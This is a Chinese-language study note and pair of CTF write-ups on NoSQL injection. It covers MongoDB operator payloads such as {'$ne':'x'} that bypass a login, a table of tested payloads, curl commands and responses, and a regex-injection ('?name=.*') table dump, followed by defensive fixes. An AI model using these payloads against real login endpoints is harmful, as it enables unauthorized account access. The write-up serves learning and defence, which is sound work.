# NoSQL 注入专题

> **SQL 里你的输入要「逃出」引号才变成代码；这里你的输入根本没有被当字符串看待 —— 它直接进了语法位置。**
> **所以重点不是"怎么闭合"，而是**「你这个位置的类型，后端有没有管」**。

---

## 一、本质：值的位置上，来了个条件

正常的写法是这样，看着一点问题都没有：

```python
@app.post("/api/login")
def login():
    data = request.get_json()
    user = db.users.find_one({
        "username": data["username"],
        "password": data["password"],      # ← 这里
    })
    if user:
        session["admin"] = True
        return {"ok": True}
    return {"error": "Unauthorized"}, 401
```

开发者心里的模型是：「`password` 是一个字符串，我要找密码等于它的那条记录」。

但 `data["password"]` 的类型**是客户端决定的**。传字符串是字符串，传对象就是对象，而 MongoDB 的查询文档里：

| 字段值的形态 | 数据库的理解 |
|---|---|
| `"hunter2"` | 等于 `hunter2`（等值匹配） |
| `{"$ne": "x"}` | **不等于 x**（操作符） |
| `{"$gt": ""}` | 大于空串（操作符） |
| `{"$regex": "^a"}` | 匹配正则（操作符） |

**一个普通的 JSON 键，变成了查询语言的一部分。**

---

## 二、机制：为什么 `$` 开头就能改语义

### 2.1 查询文档的两种含义

```javascript
// 用户正常登录，传 {"username":"admin","password":"hunter2"}
{ username: "admin", password: "hunter2" }
// → username == "admin" 且 password == "hunter2"

// 攻击者传 {"username":"admin","password":{"$ne":"x"}}
{ username: "admin", password: { $ne: "x" } }
// → username == "admin" 且 password != "x"
```

**同一个位置，值从"字面量"换成了"操作符对象"，语义就被重写了。**

### 2.2 等价成 SQL 一眼就懂

```sql
-- 正常
SELECT * FROM users WHERE username = 'admin' AND password = 'hunter2';

-- 被注入之后
SELECT * FROM users WHERE username = 'admin' AND password <> 'x';
```

只要 admin 的密码不是字符串 `x`，第二条就必然命中。**这不是"猜对了密码"，是"把判断条件换掉了"。**

### 2.3 和 SQL 注入的接缝在哪

```text
SQL 注入：字符串拼接 → 你要制造「语法边界」
          admin' OR 1=1-- 
          └─ 单引号闭合 → 结构被我改掉

NoSQL：  结构传递   → 边界原本就在，你只是把「数据槽」填成了「语法」
          {"$ne":"x"}
          └─ 不用闭合任何东西，$ 就是语法标记
```

**所以 NoSQL 注入的入口判断只有一条：这个参数进查询的时候，有没有被强制成字符串。**

---

## 三、操作符速查

登录绕过只用得上前两个，其余是拿数据用的。

| 操作符 | 语义 | 登录绕过可用？ | 备注 |
|---|---|---|---|
| `$ne` | 不等于 | ✅ 首选 | `{"$ne":"x"}`，只要求"不是 x" |
| `$exists` | 字段是否存在 | ✅ 常见 | `{"$exists":true}` |
| `$gt` / `$lt` / `$gte` / `$lte` | 大小比较 | 看类型 | 参数类型不对就整个不匹配 |
| `$in` / `$nin` | 属于 / 不属于某集合 | 看实现 | `{"$in":[null,"x"]}` |
| `$regex` | 正则匹配 | 拿数据用 | 盲注的主体：`^a`、`^ab`…… |
| `$not` | 取反 | 少用 | 常被实现忽略 |
| `$or` / `$and` | 逻辑组合 | 少见 | 要求注入点在整个查询文档的顶层 |
| `$where` | **执行 JavaScript** | 最狠 | 老版本/未禁用时能直接 sleep、读环境 |

**实用结论：遇到"用户名 + 密码"两个字段，先试 `$ne`，它是最不挑类型的一个。**

---

## 四、登录绕过的四种写法，和「为什么不都灵」

这一节是重点。**看似等价的 payload，回显会完全不同，而失败本身就是情报。**

以下全部是「西部商店」实测（`username` 固定为 `admin`）：

| password 传什么 | HTTP | 说明 |
|---|---|---|
| `"x"` | 401 | 正常等值比较，密码不对 |
| `{"$ne":"x"}` | **200** | ✅ 命中 |
| `{"$ne":""}` | **200** | ✅ 命中（参数是空串也行） |
| `{"$ne":"y"}` | **200** | ✅ 命中（随便一个字符串都行） |
| `{"$ne":0}` | 401 | ✗ 参数是数字就废 |
| `{"$ne":null}` | 401 | ✗ |
| `{"$ne":true}` | 401 | ✗ |
| `{"$gt":""}` | 401 | ✗ |
| `{"$exists":true}` | 401 | ✗ |
| `{"$exists":false}` | 401 | ✗ 两个都 401，说明它压根没实现这个算子 |
| `{"$regex":".*"}` | 401 | ✗ |
| `{"$eq":"x"}` | 401 | ✗ |
| `{"$in":[null,"x"]}` | 401 | ✗ |
| `{"$nin":["x"]}` | 401 | ✗ |
| `{"$not":{"$eq":"x"}}` | 401 | ✗ |
| `{"$type":"string"}` | 401 | ✗ |
| `username` 也传 `{"$ne":"zz"}` | 401 | ✗ 用户名那位不是注入点 |

### 从这张表能反推出什么

**规律：只有「`$ne` + 字符串参数」通。**

这不像真正的 mongod（真 Mongo 里 `$ne: 0` 同样会匹配"字段缺失"的文档），更像后端自己写了一层匹配：

```python
def check_password(stored, given):
    if isinstance(given, dict) and isinstance(given.get("$ne"), str):
        return stored != given["$ne"]        # 只认字符串参数的 $ne
    return stored == given                   # 其他一律退回等值比较，必然 False
```

**这条推断比 payload 值钱**，因为它解释了三件事：

1. `$ne:0` / `$ne:null` / `$ne:true` 为什么废 —— 类型门卡住了，退回等值比较；
2. `$exists` 真假都 401 为什么不矛盾 —— 这个算子根本没实现，不是"字段存不存在"的问题；
3. `username` 为什么注入不动 —— 先按用户名查记录，再单独比对密码，只有后一步吃到了对象。

### 教训

**别假设"这是 MongoDB，所以 `$exists` 一定能用"。** 在 CTF 里，中间可能隔着自己写的匹配层；在真实项目里，驱动、ODM、Mock 库的行为也不一致。

**做法只有一个：把算子当成黑盒，拿 HTTP 状态码当探针，一次只改一个变量，把失败也记下来。**

---

## 五、实战：「西部商店」

> 平台：CTFPlus 动态实例 · 题型：Web · 分值：10（入门 / 签到）
> 题面：**绕过登录，查找秘密**

### Step 0：先把面铺开，别急着打

首页是一张静态商店页，登录表单 POST 到 `/api/login`。把路由摸一遍，只活下来六个：

```text
GET  /             静态首页（HTML 里只有登录表单）
GET  /admin        401 {"error":"Unauthorized"}
GET  /api/admin    401 {"error":"Unauthorized"}
POST /api/login    401 / 200
POST /api/logout   200 {"ok":true}
GET  /health       200 {"status":"ok","uptime":...}
```

**判断：** 只有 `/admin` 和 `/api/admin` 是目标，其余都是外壳。`/health` 是顺手的信息泄露（暴露 uptime），跟拿 flag 无关。

### Step 1：先排掉"常规绕过"，省得后面反复怀疑

这几类一轮试完，全部 401，于是可以干净地排除：

| 试的方向 | 具体做法 | 结果 |
|---|---|---|
| 弱口令 | 12 个用户名 × 10 个常见密码，120 组 | 全 401 |
| 类型混淆当密码 | `""` / `null` / `0` / `false` / `[]` / `{}` | 全 401 |
| 请求头伪造 | `X-Forwarded-For` / `X-Real-IP` / `X-Auth-User` / `X-Original-URL` / `Remote-User` | 全 401 |
| 路径变形 | `/admin/` `/Admin` `//admin` `/admin%2f` `/./admin` | 404 或 401 |
| Host 混淆 | `Host: localhost` 等 | 被前置网关直接 404 |
| Cookie 直接伪造 | `admin=1` / `role=admin` / `session=admin` 等 | 全 401 |

**这里面有个关键信号**：`/admin` 的 401 响应带 `Vary: Cookie`，而 `/api/logout` 下发的是 Flask 的 `session=` 格式 —— 鉴权是**服务端 session**，跟请求头无关。所以"伪造请求头"这条线可以整体放弃。

### Step 2：唯一的入口是 `/api/login` 的那个 JSON

前端 JS 很干净，只做一件事：

```javascript
fetch('/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username, password })   // ← 字符串
})
```

**盯着这一行想：如果后端不强制类型，`password` 就可以不是字符串。**

于是把值换成对象：

```bash
curl -i -X POST "$B/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"x"}}'
```

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJhZG1pbiI6dHJ1ZX0...; HttpOnly; Path=/; SameSite=Lax

{"ok":true}
```

**成了。** Cookie 的 payload 解出来是 `{"admin":true}` —— 后端登录成功只是往 session 塞了这个键。

### Step 3：带 session 去拿 flag

```bash
curl -s -b cj.txt "$B/api/admin"
# {"flag":"flag{...}"}
```

`/admin` 那张页面本身不含 flag，是页面里的 `admin.js` 再去 `fetch('/api/admin')` 拉回来的：

```javascript
fetch('/api/admin', { credentials: 'same-origin', cache: 'no-store' })
```

### 整条链

```text
公开首页（静态）
  → 登录表单 POST /api/login，body 是 JSON
  → 排掉弱口令 / 请求头 / 路径 / Cookie 伪造（全部 401）
  → 注意 Vary: Cookie，鉴权在服务端 session
  → password 传对象 {"$ne":"x"} → 200 {"ok":true}
  → session = {"admin":true}
  → GET /api/admin → flag
```

---

## 六、卡点复盘

| 现象 | 原因 | 做法 |
|---|---|---|
| 所有密码都 401，连空密码也是 | 不是弱口令题 | 换思路，别在字典上加行数 |
| `{"$gt":""}` 401 | 参数类型和库里字段类型不一致 | 换 `$ne`，它对类型最不挑 |
| `{"$ne":null}` 401 | 语义是「字段存在且不为 null」，不是"随便不是 null" | 换成 `{"$ne":"任意字符串"}` |
| `$exists` 真假都 401 | 这个算子没实现 | 别纠结语义，换下一个算子 |
| `username` 传 `$ne` 不生效 | 先按用户名查，再比对密码 | 注入点只在 password 位 |
| 401 响应体永远是同一句 | 后端把所有失败都吞成 `{"error":"Unauthorized"}` | 只能拿**状态码 200/401** 当二元探针 |

---

## 七、防御

```python
# ❌ 错：把客户端给的值直接进查询
db.users.find_one({"username": u, "password": p})

# ❌ 也错：只挡住顶层字典，挡不住嵌套
if isinstance(p, dict): reject()      # {"password": {"$ne": ...}} 是嵌套，不是顶层

# ✅ 对：在「值」这一层强制类型
username = str(data.get("username") or "")
password = str(data.get("password") or "")      # 对象进来直接变成长得像 dict 的字符串，匹配不上

# ✅ 更好：别把密码交给数据库比较
user = db.users.find_one({"username": username})
if user and hmac.compare_digest(user["password_hash"], hash(password)):
    ...
```

另外三条：

1. **运算符白名单**：任何以 `$` 开头的键，在进入查询前就该被拒（`$where` 尤其）；
2. **禁用 `$where`**：它执行 JavaScript，是 NoSQL 注入里唯一能直接 RCE 的一条；
3. **账号最小权限**：应用连库的账号不该有 `dbAdmin` 之类的能力。

---

## 八、和 SQL 注入的对照（给自己看的速记）

```text
SQL：     输入是字符串 → 拼进语句 → 靠引号逃出去
NoSQL：   输入是 JSON → 进查询文档 → 靠 $ 变成算子

SQL 的判断：会不会被闭合？ → 单引号 / 双引号 / 括号
NoSQL 的判断：这个位置有没有类型约束？ → 传字符串没事，传对象呢？

SQL 的探针：' 看报错
NoSQL 的探针：{"$ne":"x"} 看状态码变不变
```

**共同的根都是一句话：用户输入跑到了「被当作代码解释」的位置。**

---

## 九、变体：正则注入（同一个根，换个载体）

> 打完 [BCACTF 2024] NoSQL 补的。那题挂着 NoSQL 的名，源码里一行数据库都没有 —— 但病根和前面完全一样。

### 病灶

```js
text.forEach(line => {
    if (line.match('^' + req.query.name + '$')) {     // ← 字符串拼进 RegExp
        goodLines.push(line);
    }
});
```

`String.prototype.match` 收到字符串时，内部就是 `new RegExp(str)`。**所以 `req.query.name` 是被当作正则源码编译的，不是当字面量。**

三种载体，一个根：

| 载体 | 输入进到哪 | 源码里的信号 |
|---|---|---|
| SQL | 拼进语句 | `"... WHERE id = " + id` |
| Mongo | 进查询文档 | `find_one({"username": u, "password": p})` |
| 正则 | 拼进 RegExp | `match('^' + x + '$')`、`new RegExp(x)` |

判断动作也完全一样：**找到那个位置，问一句「这里会不会被当语法解释」。**

### 拖全表：`?name=.*`

`^` 和 `$` 都是代码写死的，所以只要让中间那段「匹配一切」：

```text
name=.*      →  ^.*$      →  全部行
```

### 两个必须记住的坑

**① `$` 也写死了，所以「包含」不等于「等于」**

| 传 | 实际正则 | 命中 |
|---|---|---|
| `.` | `^.$` | **0 行** —— 要求整行恰好一个字符 |
| `Ricardo` | `^Ricardo$` | **0 行** —— 行尾还有 ` Olsen` |
| `R.*` | `^R.*$` | 7 行 —— R 开头 |
| `.*Ricardo.*` | `^.*Ricardo.*$` | 含 `Ricardo` 的行 |

我第一次拿 `.` 当「正则生效了吗」的探针，说它「会返回一堆」，就是漏看了 `$` —— 两端锚死之后，`^.$` 只剩「一个字符」这一个意思。**在 `^...$` 的语境下，想搜包含必须自己补 `.*`**，这和 SQL 里 `=` 和 `LIKE '%x%'` 的区别是同一件事。

**② 路由里的 `:id` 是占位符，不是 URL 的一部分**

```js
app.get('/:id/:firstName/:lastName', ...)
```

照着文档把 `/:id/Flag/Holder` 打进浏览器，`id` 就变成字面量 `:id`，怎么都匹配不上。**冒号只是「这一段取个名」，实际请求直接换成值：**

```text
❌ /:51/Flag/Holder
✅ /51/Flag/Holder
```

### 这题完整的链

```text
源码一行拼接（正则注入）
  → ?name=.* 拖出 51 行表
  → 第 51 行是 Flag Holder
  → 路由要 id + firstName + lastName
  → id 是 1 起行号（/0/… 和 /a/… 都返回 Not Valid Query）
  → /51/Flag/Holder → flag
```

flag：`bcactf{R3gex_WH1z_54dfa9cdba13}`（2024 年的题，不涉及现行赛程）

### 防御

```js
// ❌ 拼接
line.match('^' + req.query.name + '$')

// ✅ 先转义元字符再编译
const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
line.match(new RegExp('^' + esc(req.query.name) + '$'))

// ✅ 能不用正则就不用
line === req.query.name
```

---

## 十、题目记录与待打

| 项 | 来源 | 状态 |
|---|---|---|
| 登录绕过 `$ne`（字符串参数） | 西部商店 | ✅ |
| 正则注入拖全表 + 路由拼参 | [BCACTF 2024] NoSQL | ✅ |
| 登录绕过进阶 | picoCTF 2024 *No Sql Injection* | ⬜ |
| Flask session 伪造 / unicode 欺骗 / 条件竞争 | [HCTF 2018] admin | ⬜ |
| `$regex` 盲注逐字符拖数据 | — | ⬜ |
| `$where` 执行 JS / 延时 | — | ⬜ |
| `$or` 顶层逻辑注入（要求注入点在查询顶层） | — | ⬜ |
| Redis / Elasticsearch 场景 | — | ⬜ |
